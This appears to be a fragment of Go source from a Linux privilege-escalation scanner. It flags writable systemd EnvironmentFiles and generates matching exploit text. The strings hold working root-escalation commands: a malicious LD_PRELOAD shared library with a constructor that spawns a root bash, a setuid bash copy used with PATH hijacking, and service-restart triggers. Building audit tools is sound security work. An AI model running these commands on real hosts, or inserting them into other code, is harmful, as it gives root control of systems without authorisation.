//     writable env file referenced by a root-owned systemd service.
//  2. Attacker triggers a service restart (if they have restart rights) OR
//     waits for a reboot / scheduled restart.
//  3. systemd exports the env vars into the service process which runs as root
//     → the injected .so / binary executes with root privileges.
type EnvFileRootChain struct{}

func (c *EnvFileRootChain) Evaluate(report *models.ScanReport) []ChainResult {
	var results []ChainResult
	for _, ef := range report.EnvFileResults {
		if !ef.IsWritable {
			continue
		}

		var exploit string
		switch ef.InjectionType {
		case "LD_PRELOAD":
			exploit = fmt.Sprintf(
				"# Compile a malicious shared library:\n"+
				"  echo 'void __attribute__((constructor)) init(){setuid(0);setgid(0);system(\"/bin/bash\");}' > /tmp/evil.c\n"+
				"  gcc -shared -fPIC -o /tmp/evil.so /tmp/evil.c\n"+
				"# Inject into env file and trigger restart:\n"+
				"  echo 'LD_PRELOAD=/tmp/evil.so' >> %s\n"+
				"  systemctl restart %s  # or wait for reboot",
				ef.EnvFilePath, ef.ServiceName,
			)
		case "PATH":
			exploit = fmt.Sprintf(
				"# Place a malicious binary shadowing a command the service calls:\n"+
				"  cp /bin/bash /tmp/evil && chmod +s /tmp/evil\n"+
				"# Prepend /tmp to PATH in the env file and trigger restart:\n"+
				"  sed -i 's|^PATH=|PATH=/tmp:|' %s\n"+
				"  systemctl restart %s  # or wait for reboot",
				ef.EnvFilePath, ef.ServiceName,
			)
		default:
			exploit = fmt.Sprintf(
				"# Inject LD_PRELOAD into the writable env file:\n"+
				"  echo 'LD_PRELOAD=/tmp/evil.so' >> %s\n"+
				"# Build evil.so: gcc -shared -fPIC -o /tmp/evil.so evil.c\n"+
				"  systemctl restart %s  # or wait for service restart / reboot",
				ef.EnvFilePath, ef.ServiceName,
			)
		}

		riskLevel := "100% CONFIRMED"
		if ef.RiskLevel == "HIGH" {
			// /etc/default/* may be intentionally writable — downgrade to
			// POTENTIAL so the chain is visible but not over-confident.
			riskLevel = "POTENTIAL"
		}

		results = append(results, ChainResult{
			Name: fmt.Sprintf(
				"Writable EnvironmentFile '%s' (service: %s) → %s injection → root on restart",
				ef.EnvFilePath, ef.ServiceName, ef.InjectionType,
			),
			RiskLevel: riskLevel,
			Description: fmt.Sprintf(
				"Service '%s' (unit: %s) loads environment from '%s' which is writable by the "+
				"current user. Injecting LD_PRELOAD or PATH causes arbitrary code to execute "+
				"as root the next time the service is restarted.",
				ef.ServiceName, ef.ServiceFile, ef.EnvFilePath,
			),
			Exploit:    exploit,
			TargetPath: ef.EnvFilePath,
		})
	}
	return results
}